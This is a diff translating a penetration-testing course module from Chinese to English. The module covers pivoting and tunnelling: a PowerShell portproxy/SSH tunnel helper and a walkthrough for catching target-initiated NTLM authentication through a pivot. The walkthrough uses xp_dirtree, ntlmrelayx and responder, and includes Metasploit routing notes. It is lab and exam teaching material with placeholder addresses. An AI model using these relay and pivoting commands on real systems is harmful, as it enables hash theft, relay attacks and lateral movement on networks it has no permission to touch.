+  [[ -z "$kport" ]] && { warn "usage: $0 rev-client PIVOT_ADDR LISTENPORT KALI_PORT"; exit 1; }
+  say "on Kali first start the auth/callback sink (root; stop smbd before binding 445):"
+  info "sudo ntlmrelayx.py -t smb://TARGET -smb2support -c 'whoami'     # listen ${kport}"
+  say "on Kali run (client connects to receive host; R: makes that host listen on ${lport} and forward to Kali ${kport}):"
   info "$CHISEL client ${paddr} R:${lport}:127.0.0.1:${kport}"
-  say "触发参数里的地址 = 接收端机器内网 IP:${lport}（如 SQL: EXEC master..xp_dirtree '\\\\<PIVOT_IP>\\share'）"
+  say "trigger-parameter address = receive-host internal IP:${lport} (e.g. SQL: EXEC master..xp_dirtree '\\\\<PIVOT_IP>\\share')"
 }
 
 cmd_proxychains(){
   local conf="/etc/proxychains4.conf"
-  sudo test -w "$conf" || { warn "需要 sudo 写 $conf"; exit 1; }
+  sudo test -w "$conf" || { warn "need sudo to write $conf"; exit 1; }
   if ! grep -qs '^socks[45][[:space:]]*127\.0\.0\.1[[:space:]]*1080' "$conf"; then
     echo "socks5 127.0.0.1 1080" | sudo tee -a "$conf" >/dev/null
-    say "已写入: socks5 127.0.0.1 1080（若文件已有旧代理行请先注释掉）"
+    say "wrote: socks5 127.0.0.1 1080 (comment out older proxy lines first if present)"
   else
-    say "$conf 已有 127.0.0.1:1080 的 socks 行，跳过"
+    say "$conf already has a socks line for 127.0.0.1:1080 — skipped"
   fi
-  say "用法示例:"
+  say "usage examples:"
   info "proxychains4 -q netexec smb 172.16.X.0/24 -u USER -p PASS"
   info "proxychains4 -q curl http://172.16.X.50:8081/"
 }
@@ -363,23 +360,23 @@ esac
 
 ````powershell
 <#
-用途：Windows 跳板上的转发助手——netsh portproxy（正向收口/转发）与 ssh -L/-R 隧道两种形态，含防火墙放行与清理
-场景：M08 场景 34（跳板把内网站点/服务转发出去）与场景 35（在跳板上开接收口转回 Kali 的认证监听），见 docs/08-pivoting-tunneling.md
-依赖：PowerShell 3+；netsh portproxy 需要管理员权限；ssh 隧道需要目标机上存在 OpenSSH 客户端(ssh.exe)
-使用：powershell -ep bypass -f m08-port-forward.ps1 -Mode Add -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081
-      powershell -ep bypass -f m08-port-forward.ps1 -Mode Remove -ListenPort 8081
-      powershell -ep bypass -f m08-port-forward.ps1 -Mode Show
-      powershell -ep bypass -f m08-port-forward.ps1 -Mode SshTunnel -Forward Local -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081 -SshUser root -SshHost 10.10.14.5 -SshKey ~/.ssh/id_rsa
-      场景35示例(在跳板收口转 Kali): -Mode Add -ListenAddress <PIVOT_IP> -ListenPort 445 -ConnectAddress <KALI_IP> -ConnectPort 445
-占位符：PIVOT_IP=跳板内网 IP；KALI_IP=攻击机可达 IP；TARGET/TARGET_PORT=最终要访问的内网服务
-测试状态：未在 Windows 实测（本机为 macOS）；已人工核对 netsh 参数与常见错误分支
+Purpose: Forward helper on a Windows pivot — netsh portproxy (forward/sink) and ssh -L/-R tunnels, with firewall allow and cleanup
+Scenario: M08 scenario 34 (pivot exposes an internal site/service) and 35 (open a receive port on the pivot back to Kali’s auth listener) — see docs/08-pivoting-tunneling.md
+Depends: PowerShell 3+; netsh portproxy needs admin; ssh tunnels need OpenSSH client (ssh.exe) on the host
+Usage: powershell -ep bypass -f m08-port-forward.ps1 -Mode Add -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081
+       powershell -ep bypass -f m08-port-forward.ps1 -Mode Remove -ListenPort 8081
+       powershell -ep bypass -f m08-port-forward.ps1 -Mode Show
+       powershell -ep bypass -f m08-port-forward.ps1 -Mode SshTunnel -Forward Local -ListenPort 8081 -ConnectAddress 172.16.50.10 -ConnectPort 8081 -SshUser root -SshHost 10.10.14.5 -SshKey ~/.ssh/id_rsa
+       Scenario 35 example (sink on pivot toward Kali): -Mode Add -ListenAddress <PIVOT_IP> -ListenPort 445 -ConnectAddress <KALI_IP> -ConnectPort 445
+Placeholders: PIVOT_IP=pivot internal IP; KALI_IP=attacker-reachable IP; TARGET/TARGET_PORT=final internal service
+Test status: Not run on Windows (host is macOS); netsh args and common failure branches checked by hand
 #>
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)][ValidateSet('Add', 'Remove', 'Show', 'SshTunnel')][string]$Mode,
-    [string]$ListenAddress = "0.0.0.0",          # portproxy 监听地址（默认全接口）
-    [int]$ListenPort = 0,                        # 跳板上打开的端口（Add/SshTunnel 必填）
-    [string]$ConnectAddress = "",                # 转发目标（Add: 内网服务 IP；场景35: Kali IP）
+    [string]$ListenAddress = "0.0.0.0",          # portproxy listen address (default all interfaces)
+    [int]$ListenPort = 0,                        # port opened on the pivot (required for Add/SshTunnel)
+    [string]$ConnectAddress = "",                # forward target (Add: internal service IP; scenario 35: Kali IP)
     [int]$ConnectPort = 0,
     [ValidateSet('Local', 'Remote')][string]$Forward = 'Local',  # ssh -L / -R
     [string]$SshHost = "", [string]$SshUser = "", [string]$SshKey = "",
@@ -394,46 +391,46 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
 
 switch ($Mode) {
     'Add' {
-        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy 需要管理员权限（提权窗口重跑）" }
+        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy needs admin (re-run from an elevated window)" }
         if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0) {
-            Show-ErrorAndExit "Add 需要 -ListenPort / -ConnectAddress / -ConnectPort"
+            Show-ErrorAndExit "Add needs -ListenPort / -ConnectAddress / -ConnectPort"
         }
-        # 先清同名，避免重复添加报错
+        # Clear same binding first to avoid duplicate-add errors
         netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
         netsh interface portproxy add v4tov4 listenport=$ListenPort listenaddress=$ListenAddress `
             connectport=$ConnectPort connectaddress=$ConnectAddress
-        if ($LASTEXITCODE -ne 0) { Show-ErrorAndExit "portproxy 添加失败（exit $LASTEXITCODE）" }
+        if ($LASTEXITCODE -ne 0) { Show-ErrorAndExit "portproxy add failed (exit $LASTEXITCODE)" }
         Write-Output "[+] portproxy: $ListenAddress`:$ListenPort -> $ConnectAddress`:$ConnectPort"
         if ($AddFirewallRule) {
             netsh advfirewall firewall add rule name="fp-in-$ListenPort" dir=in action=allow `
                 protocol=TCP localport=$ListenPort | Out-Null
-            Write-Output "[+] 已放行入站 TCP $ListenPort（规则名 fp-in-$ListenPort）"
+            Write-Output "[+] allowed inbound TCP $ListenPort (rule name fp-in-$ListenPort)"
         }
-        Write-Output "[i] 验证: netsh interface portproxy show all ；回滚: $PSCommandPath -Mode Remove -ListenPort $ListenPort"
+        Write-Output "[i] verify: netsh interface portproxy show all ; rollback: $PSCommandPath -Mode Remove -ListenPort $ListenPort"
     }
     'Remove' {
-        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy 需要管理员权限" }
-        if ($ListenPort -le 0) { Show-ErrorAndExit "Remove 需要 -ListenPort" }
+        if (-not $isAdmin) { Show-ErrorAndExit "netsh portproxy needs admin" }
+        if ($ListenPort -le 0) { Show-ErrorAndExit "Remove needs -ListenPort" }
         netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress 2>$null
-        Write-Output "[-] 已删除 portproxy $ListenAddress`:$ListenPort"
+        Write-Output "[-] removed portproxy $ListenAddress`:$ListenPort"
         if ($RemoveFirewallRule) {
             netsh advfirewall firewall delete rule name="fp-in-$ListenPort" | Out-Null
-            Write-Output "[-] 已删除防火墙规则 fp-in-$ListenPort"
+            Write-Output "[-] removed firewall rule fp-in-$ListenPort"
         }
     }
     'Show' {
         netsh interface portproxy show all
-        Write-Output "`n[i] 当前 IPv4 转发规则如上；连接数/占用用: netstat -ano | findstr LISTENING"
+        Write-Output "`n[i] IPv4 forward rules above; connections/occupancy: netstat -ano | findstr LISTENING"
     }
     'SshTunnel' {
         $ssh = Get-Command ssh.exe -ErrorAction SilentlyContinue
-        if (-not $ssh) { Show-ErrorAndExit "未找到 ssh.exe —— 目标无 OpenSSH 客户端时改用 -Mode Add (netsh)" }
+        if (-not $ssh) { Show-ErrorAndExit "ssh.exe not found — without OpenSSH client use -Mode Add (netsh)" }
         if ($ListenPort -le 0 -or -not $ConnectAddress -or $ConnectPort -le 0 -or -not $SshHost -or -not $SshUser) {
-            Show-ErrorAndExit "SshTunnel 需要 -ListenPort / -ConnectAddress / -ConnectPort / -SshHost / -SshUser"
+            Show-ErrorAndExit "SshTunnel needs -ListenPort / -ConnectAddress / -ConnectPort / -SshHost / -SshUser"
         }
         $sshArgs = @('-N')
-        # 本地转发(-L): 本机 ListenPort -> ConnectAddress:ConnectPort（场景34）；远程转发(-R): 远端 listen -> 本机
-        # 注意 ssh -R 默认只绑远端回环，需对端 sshd 配置 GatewayPorts 才能被其他主机连到（见 docs/08 场景35备选）
+        # Local (-L): local ListenPort -> ConnectAddress:ConnectPort (scenario 34); Remote (-R): remote listen -> local
+        # Note: ssh -R binds remote loopback by default; remote sshd needs GatewayPorts for other hosts to connect (see docs/08 scenario 35 fallback)
         $spec = if ($Forward -eq 'Local') {
             "127.0.0.1:$ListenPort`:$ConnectAddress`:$ConnectPort"
         } else {
@@ -444,118 +441,118 @@ switch ($Mode) {
         if ($SshKey) { $sshArgs += @('-i', $SshKey) }
         $sshArgs += @('-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=30')
         $sshArgs += "$($SshUser)@$SshHost"
-        Write-Output "[i] 执行: ssh $($sshArgs -join ' ')   （Ctrl+C 断开隧道）"
+        Write-Output "[i] running: ssh $($sshArgs -join ' ')   (Ctrl+C to drop the tunnel)"
         & $ssh.Source $sshArgs
     }
 }
 ````
 
-## 4. 场景 35：代理能连接内网目标，但目标主动认证到不了你的监听端
+## 4. Scenario 35: Proxy can reach the internal target, but target-initiated auth never hits your listener
 
-### Scenario回顾
-你可以经 SOCKS 访问内网 SQL 或域服务（正向 OK），但触发目标**主动连接**（SQL 认证/中继、NTLM 回连）时没有任何认证到达监听端。正向访问与目标回连是两条不同路径（依据：C4 SQL 认证与中继场景）。
+### Situation
+You can reach internal SQL or domain services via SOCKS (forward OK), but when you trigger the target to **connect outbound** (SQL auth/relay, NTLM callback) nothing arrives at the listener. Forward access and target callback are different paths (basis: C4 SQL auth and relay situations).
 
-### 前提与假设
-- 已有 SOCKS/隧道能正向访问内网目标（能跑 `proxychains ... mssql` / 域查询）。
-- 目标（SQL Server、域主机）进程能主动外连到**同一网段内某台机器**，但**到不了 Kali**（防火墙/ACL/分段）。
-- 你控制一台目标网段内的机器（Ligolo agent / Windows 跳板），或在目标网段内有可执行文件的位置。
+### Assumptions
+- You already have SOCKS/tunnel forward access to the internal target (`proxychains ... mssql` / domain queries work).
+- The target process (SQL Server, domain host) can initiate outbound connects to **some host in the same subnet**, but **not to Kali** (firewall/ACL/segmentation).
+- You control a host in the target subnet (Ligolo agent / Windows pivot), or have a place there where you can run a binary.
 
-### 准备（attacker box侧）
+### Prepare (attacker)
 ```bash
-# Kali：认证接收端 + 中继工具就位（root 运行，SMB 445 需要特权）
-sudo systemctl stop smbd   # 先释放 445，否则 responder/ntlmrelayx 起不来
-sudo rlwrap responder -I eth0 -A    # 或
-sudo ntlmrelayx.py -t smb://TARGET_IP -smb2support -c 'whoami'   # 中继版
+# Kali: auth sink + relay tools ready (run as root; SMB 445 needs privilege)
+sudo systemctl stop smbd   # free 445 or responder/ntlmrelayx will not bind
+sudo rlwrap responder -I eth0 -A    # or
+sudo ntlmrelayx.py -t smb://TARGET_IP -smb2support -c 'whoami'   # relay variant
 ```
-确认 Kali 本地监听端口（445/HTTP）能与隧道 **--to 指向的 127.0.0.1 端口**一致。
+Confirm Kali’s local listen port (445/HTTP) matches the tunnel’s **`--to` 127.0.0.1 port**.
 
-### 执行步骤
-**Step 0 · 确认"两条路径"**：正向用 proxychains 访问 OK，不等于目标能连 Kali。在目标可达的那台机器（agent/跳板）上起一个临时监听，从目标侧触发一次连接，看是否到达。
+### Procedure
+**Step 0 · Confirm “two paths”**: forward OK via proxychains does **not** mean the target can reach Kali. On a target-reachable host (agent/pivot), open a temporary listener and trigger one connect from the target side — see whether it arrives.
 
-**Step 1 · 在目标可达位置开接收口（推荐 Ligolo-ng listener，方向 = 反连转发）**：
+**Step 1 · Open a receive port where the target can reach (prefer Ligolo-ng listener; direction = reverse forward)**:
 ```
-# Kali 终端 1：认证接收端（真实监听在 Kali 本机）
-sudo ntlmrelayx.py -t smb://<内网目标> -smb2support ...    # 监听 0.0.0.0:445
-# Kali 终端 2（ligolo proxy 控制台）：agent 在目标侧 0.0.0.0:445 接收 → 转发回 Kali 127.0.0.1:445
+# Kali terminal 1: auth sink (real listen on Kali)
+sudo ntlmrelayx.py -t smb://<internal-target> -smb2support ...    # listen 0.0.0.0:445
+# Kali terminal 2 (ligolo proxy console): agent listens 0.0.0.0:445 on the target side → forward to Kali 127.0.0.1:445
 listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
 listener_list
 ```
-**Step 2 · 触发参数里的地址 = agent 所在机器（目标可达的那个 IP），不是 Kali**：
+**Step 2 · Address in trigger params = agent host (the IP the target can reach), not Kali**:
 ```sql
--- 目标 SQL 上触发对外 SMB 认证（示例：UNC 目录列举）
+-- On target SQL, trigger outbound SMB auth (example: UNC directory listing)
 EXEC master..xp_dirtree '\\<AGENT_INTERNAL_IP>\share';
--- 或 xp_subdirs / xp_fileexist；低权限 SQL 也常能触发（见 [11-mssql](/modules/11-mssql)）
+-- or xp_subdirs / xp_fileexist; low-priv SQL can often still trigger (see [11-mssql](/modules/11-mssql))
 ```
-认证包：目标 → `<AGENT_INTERNAL_IP>:445` → Ligolo 隧道 → Kali 127.0.0.1:445（ntlmrelayx/responder）。到达即中继或落盘哈希。
+Auth packet path: target → `<AGENT_INTERNAL_IP>:445` → Ligolo tunnel → Kali 127.0.0.1:445 (ntlmrelayx/responder). Arrival means relay or capture the hash.
 
-**Step 3 · Windows 跳板替代方案（netsh portproxy，跳板能出网到 Kali 时）**：
+**Step 3 · Windows pivot alternative (netsh portproxy, when the pivot can egress to Kali)**:
 ```powershell
-# 在 Windows 跳板（管理员）执行：监听跳板 445 → 转发到 Kali 的 ntlmrelayx
+# On Windows pivot (admin): listen pivot 445 → forward to Kali ntlmrelayx
 netsh interface portproxy add v4tov4 listenport=445 listenaddress=<PIVOT_IP> connectport=445 connectaddress=<KALI_IP>
-# 触发参数改成 \\<PIVOT_IP>\share；Verify：netsh interface portproxy show all
+# Trigger params become \\<PIVOT_IP>\share; verify: netsh interface portproxy show all
 ```
-前提：跳板→Kali:445 出网放行（agent/beacon 能出网通常意味着行）；目标→跳板:445 放行。
+Requires: pivot→Kali:445 egress allowed (agent/beacon egress usually implies this); target→pivot:445 allowed.
 
-**Step 4 · Linux 跳板备选（ssh -R，需 sshd 允许外部绑定）**：
+**Step 4 · Linux pivot fallback (ssh -R; sshd must allow external bind)**:
 ```bash
-# Kali 侧执行；绑在跳板 0.0.0.0:445，转发回 Kali 127.0.0.1:445
+# Run from Kali; bind pivot 0.0.0.0:445, forward to Kali 127.0.0.1:445
 ssh -N -R 0.0.0.0:445:127.0.0.1:445 USER@PIVOT_IP
-# sshd 需 GatewayPorts clientspecified/yes；否则 -R 只绑回环，目标连不到——先确认再依赖
+# sshd needs GatewayPorts clientspecified/yes; otherwise -R binds loopback only and the target cannot connect — confirm before relying on it
 ```
 
-### 用到的脚本
-- `m08-ligolo-ng-setup.sh`（reverse 子命令，反连转发的标准模板）
-- `m08-port-forward.ps1`（Windows 跳板 portproxy，含回滚/清理）
-- 触发侧模板见 [11-mssql](/modules/11-mssql) 与 [16-ics-calendar](/modules/16-ics-calendar)（认证触发手段）
+### Lab files
+- `m08-ligolo-ng-setup.sh` (`reverse` subcommand — standard reverse-forward template)
+- `m08-port-forward.ps1` (Windows pivot portproxy, with rollback/cleanup)
+- Trigger-side templates: [11-mssql](/modules/11-mssql) and [16-ics-calendar](/modules/16-ics-calendar) (auth-trigger techniques)
 
 ### Verify
-1. `listener_list` 确认 listener 已加；`ss -tlnp` 确认 Kali 上 445/目标端口真在监听。
-2. 触发后 ntlmrelayx/responder 打印认证来源 IP——应为**目标/中继方**，不是 Kali 自身。
-3. 中继成功判定：目标主机上执行命令/拿到会话；只捕获哈希时确认 hash 格式与后续破解工具匹配。
+1. `listener_list` shows the listener; `ss -tlnp` shows 445 / the target port really listening on Kali.
+2. After trigger, ntlmrelayx/responder prints the auth source IP — should be the **target/relay party**, not Kali itself.
+3. Relay success: command/session on the target host; if only capturing hashes, confirm hash format matches your cracker.
 
-### 失败分支与备选
-1. **还是没认证到达** → 回到 Step 0：先在目标可达机器上开临时 `nc -lvnp`，从目标侧手动触发一次 TCP 连接，判断是"路径不通"还是"触发参数没生效"——一次只改一个变量。
-2. **445 被占/绑定失败** → Kali 先 `sudo systemctl stop smbd`；用非特权端口（如 4455）做 --to 目标并同步改触发侧……（SMB 认证必须 445，若中继到 445 受限，改走 ntlmrelayx HTTP 中继或直接 responder 捕获后用 hash 破解/重放）。
-3. **目标只能连本机回环**（SQL 与跳板同机、跳板在目标上）→ 在**目标本机**放 agent/转发器，触发地址用 `127.0.0.1`（ligolo agent 跑在目标上时 --addr 0.0.0.0:445 即本机）。
-4. **ligolo 不可用** → chisel / netsh portproxy / ssh -R 三条替代里选符合"目标可达"条件的（跳板形态决定）。
+### If it fails
+1. **Still no auth arrives** → back to Step 0: temporary `nc -lvnp` on a target-reachable host, manually trigger one TCP connect from the target side, decide “path broken” vs “trigger params ineffective” — change one variable at a time.
+2. **445 occupied / bind fails** → on Kali first `sudo systemctl stop smbd`; use a non-privileged port (e.g. 4455) as the `--to` target and sync the trigger side… (SMB auth must be 445; if relaying to 445 is constrained, switch to ntlmrelayx HTTP relay or responder capture then crack/replay the hash).
+3. **Target can only reach local loopback** (SQL and pivot are the same host / pivot is on the target) → place the agent/forwarder **on the target itself**; trigger address `127.0.0.1` (when ligolo agent runs on the target, `--addr 0.0.0.0:445` is local).
+4. **Ligolo unavailable** → pick among chisel / netsh portproxy / ssh -R whichever matches “target can reach” (pivot shape decides).
 
-### 考试注意 OPSEC
-- 触发**一次**认证就够，别反复触发制造噪声；每次触发前确认监听已就位。
-- SMB/HTTP 中继要求目标与中继**同网段且不开 SMB 签名**（可先探测）；EPA/签名等条件见 [12-ad-attacks](/modules/12-ad-attacks) ESC8 与 [16-ics-calendar](/modules/16-ics-calendar)。
-- 地址一致性铁律：触发参数里的 IP 永远是"目标可达的那台机"，端口永远是"那条隧道在目标侧开的端口"，两者都要在笔记里写清并复现。
+### Exam notes / OPSEC
+- Trigger auth **once** — do not spam; confirm the listener is up before each trigger.
+- SMB/HTTP relay needs target and relay **same subnet and SMB signing off** (probe first); EPA/signing conditions: [12-ad-attacks](/modules/12-ad-attacks) ESC8 and [16-ics-calendar](/modules/16-ics-calendar).
+- Address consistency rule: IP in trigger params is always “the host the target can reach”; port is always “the tunnel port opened on that target-side host” — write both down and reproduce them.
 
 ---
 
-## 5. 工具选择速查（本模块覆盖范围之外不展开）
+## 5. Tool choice quick map (outside this module’s scope: not expanded)
 
-| 需求 | 首选 | 备选 | 注意 |
+| Need | First choice | Fallback | Notes |
 |---|---|---|---|
-| 访问单个内网 Web（场景 34） | ssh `-L`（跳板可 SSH） | ligolo 240.0.0.1 / chisel `R:` | 端口别冲突 11601/1080 |
-| 整段内网像本地一样访问 | Ligolo-ng 全子网路由 | sshuttle（跳板可 SSH，需 root） | sshuttle 对 ICMP/UDP 支持差 |
-| 任意工具走代理 | proxychains + SOCKS（msf socks_proxy / chisel `R:socks` / ssh `-D`） | `proxychains4` 配置加 `socks5 127.0.0.1 1080` | 确认 `/etc/proxychains4.conf` 末尾代理行 |
-| 目标主动回连收口（场景 35） | Ligolo `listener_add --to 127.0.0.1:LPORT` | netsh portproxy / ssh `-R` | 接收端永远放目标可达位置 |
-| Metasploit 会话内路由 | `post/multi/manage/autoroute` + `auxiliary/server/socks_proxy` | `route`/`route flush` 管理 | SESSION 平台不匹配警告通常无害 |
-| 双击穿透（第三层） | Ligolo 第二 tun + `listener_add 0.0.0.0:11601 --to 127.0.0.1:11601` | 递归同法 | 每层一个 tun 接口，别复用 |
+| Hit one internal web (scenario 34) | ssh `-L` (pivot has SSH) | ligolo 240.0.0.1 / chisel `R:` | avoid port clashes with 11601/1080 |
+| Whole internal range like local | Ligolo-ng full subnet route | sshuttle (pivot has SSH, needs root) | sshuttle weak on ICMP/UDP |
+| Arbitrary tools via proxy | proxychains + SOCKS (msf socks_proxy / chisel `R:socks` / ssh `-D`) | add `socks5 127.0.0.1 1080` to `proxychains4` | confirm trailing proxy line in `/etc/proxychains4.conf` |
+| Target-initiated callback sink (scenario 35) | Ligolo `listener_add --to 127.0.0.1:LPORT` | netsh portproxy / ssh `-R` | receive side always where the target can reach |
+| Metasploit in-session routing | `post/multi/manage/autoroute` + `auxiliary/server/socks_proxy` | `route` / `route flush` | SESSION platform mismatch warnings are usually harmless |
+| Double pivot (third layer) | Ligolo second tun + `listener_add 0.0.0.0:11601 --to 127.0.0.1:11601` | recurse the same pattern | one tun iface per layer — do not reuse |
 
-Metasploit 速记：
+Metasploit quick notes:
 ```
 msf6 > use post/multi/manage/autoroute      # set SESSION / SUBNET / NETMASK
 msf6 > use auxiliary/server/socks_proxy     # set SRVHOST 127.0.0.1 / SRVPORT 1080 / VERSION 4a
 ```
-sshuttle 速记（跳板可 SSH 时，透明访问内网 Web 比 proxychains 稳）：
+sshuttle quick notes (when pivot has SSH — more stable than proxychains for transparent internal web):
 ```bash
 sudo sshuttle -v -e "ssh -i id_rsa" -r USER@PIVOT_IP 172.16.X.0/24
-# 之后直接 curl http://172.16.X.50:8081/ 无需代理前缀
+# then curl http://172.16.X.50:8081/ directly — no proxy prefix
 ```
 
 ---
 
-## 6. 关联文档
+## 6. Related docs
 
-| 文档 | 内容 |
+| Doc | Contents |
 |---|---|
-| [00-environment-and-infra](/modules/00-environment-and-infra) | 端口规划（11601/1080/8081…）、日志纪律 |
-| [11-mssql](/modules/11-mssql) | 场景 35 的认证触发手段（xp_dirtree 等） |
-| [16-ics-calendar](/modules/16-ics-calendar) | 外部触发认证的另一种形态 |
-| [09-c2-egress-channels](/modules/09-c2-egress-channels) | 出网通道与"全阶段同路径"原则 |
-| `m08-ligolo-ng-setup.sh` 等 | 本模块脚本用法 |
+| [00-environment-and-infra](/modules/00-environment-and-infra) | Port plan (11601/1080/8081…), logging discipline |
+| [11-mssql](/modules/11-mssql) | Scenario 35 auth-trigger techniques (`xp_dirtree`, etc.) |
+| [16-ics-calendar](/modules/16-ics-calendar) | Another shape of externally triggered auth |
+| [09-c2-egress-channels](/modules/09-c2-egress-channels) | Egress channels and “same path for every stage” |
+| `m08-ligolo-ng-setup.sh` etc. | Lab-file usage for this module |
